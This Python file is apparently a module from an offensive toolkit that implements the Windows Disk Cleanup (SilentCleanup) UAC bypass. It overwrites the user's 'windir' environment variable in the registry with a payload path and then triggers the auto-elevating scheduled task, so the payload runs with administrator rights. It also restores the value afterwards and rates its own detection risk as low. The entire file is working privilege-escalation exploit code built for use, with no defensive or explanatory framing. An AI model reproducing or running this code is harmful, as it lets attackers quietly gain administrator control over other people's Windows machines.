"""
Disk Cleanup UAC Bypass Module
Bypasses UAC using environment variable hijacking.

How it works:
1. Disk Cleanup Wizard auto-elevates via scheduled task
2. Uses environment variable hijacking via %windir%
3. SilentCleanup scheduled task runs cleanmgr.exe
4. Hijacked %windir% causes payload execution

Works on: Windows 7/8/10/11 (reliable across versions)
"""

from pathlib import Path

import sys

sys.path.append(str(Path(__file__).parent.parent))
from ..core.base import UACBypassBase

try:
    import winreg

    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False


class DiskCleanupBypass(UACBypassBase):
    """UAC bypass using Disk Cleanup scheduled task."""

    METHOD_NAME = "diskcleanup"
    DESCRIPTION = "Disk Cleanup UAC bypass (Windows 7+)"
    MIN_VERSION = 7
    MAX_BUILD = 99999  # Works on latest versions
    DETECTION_RISK = "Low"
    SUCCESS_RATE = 0.85

    # Registry path for environment variables
    REG_PATH = r'Environment'

    # Scheduled task to trigger
    TASK_PATH = r'\Microsoft\Windows\DiskCleanup\SilentCleanup'

    def __init__(self, output_dir: str = "uac_bypasses", verbose: bool = False):
        """
        Initialize the diskcleanup bypass.

        Args:
            output_dir: Directory for storing output files
            verbose: Enable verbose logging
        """
        super().__init__(output_dir, verbose)
        self.original_windir = None
        self.had_original = False
        self.log("Disk Cleanup bypass module initialized", "SUCCESS")

    def bypass(self, payload_path: str) -> bool:
        """
        Execute Disk Cleanup UAC bypass.

        Args:
            payload_path: Path to payload executable

        Returns:
            True if successful, False otherwise
        """
        if not WINDOWS_AVAILABLE:
            self.log("Windows registry not available", "ERROR")
            return False

        self.log("Hijacking environment variable for diskcleanup bypass...", "INFO")

        try:
            # Open environment variables key
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                self.REG_PATH,
                0,
                winreg.KEY_ALL_ACCESS
            )

            # Backup original windir value
            try:
                self.original_windir, _ = winreg.QueryValueEx(key, 'windir')
                self.had_original = True
            except WindowsError:
                self.original_windir = None
                self.had_original = False

            # Set windir to include our payload
            # When cleanmgr.exe expands %windir%, it will execute our payload
            malicious_value = f'{payload_path} & '
            winreg.SetValueEx(key, 'windir', 0, winreg.REG_SZ, malicious_value)

            winreg.CloseKey(key)

            self.log("Environment variable hijacked", "SUCCESS")

            # Execute cleanmgr via scheduled task
            self.log("Triggering SilentCleanup scheduled task...", "INFO")

            success = self.execute_process(
                f'schtasks /Run /TN "{self.TASK_PATH}" /I',
                wait=False,
                timeout=5
            )

            # Restore original value immediately
            self._restore_windir()

            return success

        except Exception as e:
            self.log(f"Diskcleanup bypass failed: {e}", "ERROR")
            self._restore_windir()
            return False

    def _restore_windir(self) -> None:
        """Restore original windir environment variable."""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                self.REG_PATH,
                0,
                winreg.KEY_ALL_ACCESS
            )

            if self.had_original and self.original_windir:
                winreg.SetValueEx(key, 'windir', 0, winreg.REG_SZ, self.original_windir)
                if self.verbose:
                    self.log("Restored original windir value", "SUCCESS")
            else:
                try:
                    winreg.DeleteValue(key, 'windir')
                    if self.verbose:
                        self.log("Removed hijacked windir value", "SUCCESS")
                except WindowsError:
                    pass

            winreg.CloseKey(key)

        except Exception as e:
            if self.verbose:
                self.log(f"Warning during windir restoration: {e}", "WARNING")

    def cleanup_registry(self) -> None:
        """Override cleanup to restore windir."""
        self._restore_windir()
        super().cleanup_registry()


if __name__ == "__main__":
    bypass = DiskCleanupBypass(verbose=True)
    print(f"\nMethod: {bypass.METHOD_NAME}")
    print(f"Description: {bypass.DESCRIPTION}")
    print(f"Success Rate: {bypass.SUCCESS_RATE * 100:.0f}%")